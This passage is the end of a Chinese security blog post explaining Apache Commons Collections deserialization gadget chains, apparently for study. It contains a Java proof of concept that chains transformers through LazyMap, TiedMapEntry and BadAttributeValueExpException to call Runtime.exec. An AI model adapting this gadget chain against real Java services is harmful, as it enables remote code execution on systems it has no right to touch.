+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">     Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125; ;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantFactory</span>(<span class="hljs-number">1</span>));<br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;qq&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;qq&quot;</span>);<br>      <br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bfield</span> <span class="hljs-operator">=</span>  b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        bfield.setAccessible(<span class="hljs-literal">true</span>);<br>        bfield.set(badAttributeValueExpException,tiedMapEntry);<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryfield.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryfield.set(lazyMap,chainedTransformer);<br><br><span class="hljs-comment">//        serialize(badAttributeValueExpException);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实CC的精髓，就是去找谁的<code>readObject</code>​可以传任意调用对象，并且可以走到 <code>transform</code>​里头来进行动态类加载或者任意方法调用</p>
+<p>最后附上CC的结构图 我个人觉得还是画得比较清晰的</p>
+<p>​<img src="/assets/image-20231211135100-19md6in.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CommonsCollections 全系列详解</div>
+      <div>https://zjackky.github.io/2023/12/11/CommonsCollections 全系列详解/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zjacky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/10/hello-world/" title="Hello World">
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/Zjackky/Zjackky.github.io" target="_blank" rel="nofollow noopener"><span>My Github</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
